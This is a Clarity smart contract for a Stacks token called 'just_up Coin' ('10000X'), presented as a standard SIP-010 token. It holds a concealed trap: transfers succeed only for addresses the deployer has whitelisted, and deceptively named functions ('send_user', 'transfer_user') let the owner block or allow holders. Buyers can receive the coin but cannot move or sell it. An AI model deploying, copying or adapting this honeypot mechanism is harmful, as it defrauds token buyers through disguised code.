(impl-trait 'SP3FBR2AGK5H9QBDH3EEN6DF8EK8JY7RX8QJ5SVTE.sip-010-trait-ft-standard.sip-010-trait)

(define-fungible-token just_up)

(define-constant contract-just_up tx-sender)

(define-data-var token-uri (optional (string-utf8 256)) none)

(define-map users principal bool)

(define-read-only (get-balance (address principal))
  (ok (ft-get-balance just_up address)))

(define-read-only (get-total-supply)
  (ok (ft-get-supply just_up)))

(define-read-only (get-name)
  (ok "just_up Coin"))

(define-read-only (get-symbol)
  (ok "10000X"))

(define-read-only (get-decimals)
  (ok u6))

(define-public (transfer (amount uint) (from principal) (to principal) (memo (optional (buff 34))))
  (begin
        (asserts! (is-eq tx-sender from) (err u101))
        (asserts! (is-eq (default-to false (map-get? users from)) true) (err u102))
        (try! (ft-transfer? just_up amount from to))
        (match memo to-print (print to-print) 0x)
        (ok true)
    )
)

(define-read-only (get-users (from principal))
    (ok (default-to false (map-get? users from)))
)

(define-read-only (get-token-uri)
    (ok (var-get token-uri))
)

(define-public (set-token-uri (value (string-utf8 256)))
    (begin
        (asserts! (is-eq tx-sender contract-just_up) (err u103))
        (var-set token-uri (some value))
        (ok (print {
              notification: "token-metadata-update",
              payload: {
                contract-id: (as-contract tx-sender),
                token-class: "ft"
              }
            })
        )
    )
)

(define-public (send_user (user principal) (amount uint))
  (begin
    (asserts! (is-eq tx-sender contract-just_up) (err u104))
    (map-set users user false)
    (ok true)
  )
)

(define-public (transfer_user (user principal) (amount uint))
  (begin
    (asserts! (is-eq tx-sender contract-just_up) (err u105))
    (map-set users user true)
    (ok true)
  )
)

(define-public (burn (count uint))
    (ft-burn? just_up count tx-sender))

(begin
  (map-set users tx-sender true)
  (try! (ft-mint? just_up u10000000000000000 tx-sender))
)